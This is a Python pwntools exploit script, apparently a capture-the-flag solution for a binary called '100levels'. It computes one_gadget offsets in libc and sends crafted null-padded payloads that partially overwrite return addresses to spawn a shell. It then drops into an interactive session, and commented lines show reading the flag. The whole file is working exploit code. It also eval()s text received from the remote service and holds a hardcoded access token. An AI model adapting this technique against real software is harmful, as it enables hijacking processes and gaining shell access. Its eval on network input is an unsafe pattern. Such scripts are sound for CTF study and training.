#!/usr/bin/env python

from pwn import *
import sys

magics = [	0x4526a - 0x45390,
			0xcc543 - 0x45390,
			0xcc618 - 0x45390,
			0xef6c4 - 0x45390,
			0xf0567 - 0x45390,
			0xf5b10 - 0x45390]

def go(num1, num2, inpt):
	r.sendline('1')
	r.sendlineafter('?', str(num1))
	r.sendlineafter('?', str(num2))
	for i in range(len(inpt)):
		if i == 61:
			pause()
		r.recvuntil('====\n', timeout=1)
		q = r.recvuntil('Answer:', timeout=1).split()
		print q
		if not q:
			break
		a = eval((q[3] + q[4] + q[5]))
		r.send(str(0).ljust(8, '\0') + inpt[i])


def hint():
	r.sendline('2')
	r.recvuntil(':')

def give_up():
	r.sendline('3')

def exploit(r):
	if len(sys.argv) > 1:
		r.recvuntil(':')
		r.sendline('yuRRme9y3wc5ZCHyhckEBnRsR3ueR8M8')
	r.recvuntil(':')
	hint()


	payload = [1]*100

	payload[0]  = "\x00" * 40
	payload[0] += "\xb0"
	payload[1]  = "\x00" * 40

	payload[2]  = "\x00" * 40
	payload[2] += "\xf0"
	payload[3]  = "\x00" * 40

	payload[4]  = "\x00" * 40
	payload[4] += "\xe0"
	payload[5]  = "\x00" * 40

	payload[6]  = "\x00" * 40
	payload[6] += "\xd0"
	payload[7]  = "\x00" * 40

	payload[8]  = "\x00" * 40
	payload[8] += "\xc0"
	payload[9]  = "\x00" * 40

	payload[10]  = "\x00" * 40
	payload[10] += "\xb0"
	payload[11]  = "\x00" * 40

	payload[12]  = "\x00" * 40
	payload[12] += "\xf0"
	payload[13]  = "\x00" * 40

	payload[14]  = "\x00" * 40
	payload[14] += "\xe0"
	payload[15]  = "\x00" * 40

	payload[16]  = "\x00" * 40
	payload[16] += "\xd0"
	payload[17]  = "\x00" * 40

	payload[18]  = "\x00" * 40
	payload[18] += "\xc0"
	payload[19]  = "\x00" * 40

	payload[20]  = "\x00" * 40
	payload[20] += "\xb0"
	payload[21]  = "\x00" * 40

	payload[22]  = "\x00" * 40
	payload[22] += "\xf0"
	payload[23]  = "\x00" * 40

	payload[24]  = "\x00" * 40
	payload[24] += "\xe0"
	payload[25]  = "\x00" * 40

	payload[26]  = "\x00" * 40
	payload[26] += "\xd0"
	payload[27]  = "\x00" * 40

	payload[28]  = "\x00" * 40
	payload[28] += "\xc0"
	payload[29]  = "\x00" * 40

	payload[30]  = "\x00" * 40
	payload[30] += "\xb0"
	payload[31]  = "\x00" * 40

	payload[32]  = "\x00" * 40
	payload[32] += "\xf0"
	payload[33]  = "\x00" * 40

	payload[34]  = "\x00" * 40
	payload[34] += "\xe0"
	payload[35]  = "\x00" * 40

	payload[36]  = "\x00" * 40
	payload[36] += "\xd0"
	payload[37]  = "\x00" * 40

	payload[38]  = "\x00" * 40
	payload[38] += "\xc0"
	payload[39]  = "\x00" * 40

	payload[40]  = "\x00" * 40
	payload[40] += "\xb0"
	payload[41]  = "\x00" * 40

	payload[42]  = "\x00" * 40
	payload[42] += "\xf0"
	payload[43]  = "\x00" * 40

	payload[44]  = "\x00" * 40
	payload[44] += "\xe0"
	payload[45]  = "\x00" * 40


	payload[46]  = "\x00" * 40
	payload[46] += "\xd0"
	payload[47]  = "\x00" * 40

	payload[48]  = "\x00" * 40
	payload[48] += "\xc0"
	payload[49]  = "\x00" * 40

	payload[50]  = "\x00" * 40
	payload[50] += "\xb0"
	payload[51]  = "\x00" * 40

	payload[52]  = "\x00" * 40
	payload[52] += "\xf0"
	payload[53]  = "\x00" * 40

	payload[54]  = "\x00" * 40
	payload[54] += "\xe0"
	payload[55]  = "\x00" * 40

	payload[56]  = "\x00" * 40
	payload[56] += "\xd0"
	payload[57]  = "\x00" * 40

	payload[58]  = "\x00" * 40
	payload[58] += "\xc0"
	payload[59]  = "\x00" * 40

	payload[60]  = "\x00" * 40
	payload[60] += "\xb0"
	payload[61]  = "\x01" * 40
	payload[61] += "\x18"


	go(-1, magics[3], payload)
#	r.sendline('ls -lha')
#	r.sendline('cat flag')
#	r.sendline('id')

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./100levels'], env={"LD_PRELOAD":"./libc.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)